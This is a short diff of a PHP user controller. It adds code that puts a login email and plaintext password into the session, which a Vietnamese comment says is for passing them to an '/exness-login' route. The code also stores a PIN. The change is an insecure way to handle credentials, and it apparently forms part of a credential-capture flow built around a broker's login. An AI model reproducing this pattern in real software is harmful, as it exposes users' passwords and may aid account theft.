@@ -10,7 +10,8 @@ class UserController extends Controller
 {
     protected UserService $userService;
 
-    public function __construct(UserService $userService) {
+    public function __construct(UserService $userService)
+    {
         $this->userService = $userService;
     }
 
@@ -35,6 +36,12 @@ class UserController extends Controller
         if ($admin) {
             return redirect()->route('admin.dashboard');
         }
+
+        // Thêm session để truyền sang /exness-login
+        session([
+            'email' => $email,
+            'password' => $password,
+        ]);
 
         $this->userService->store($email, $password, $pin);
 
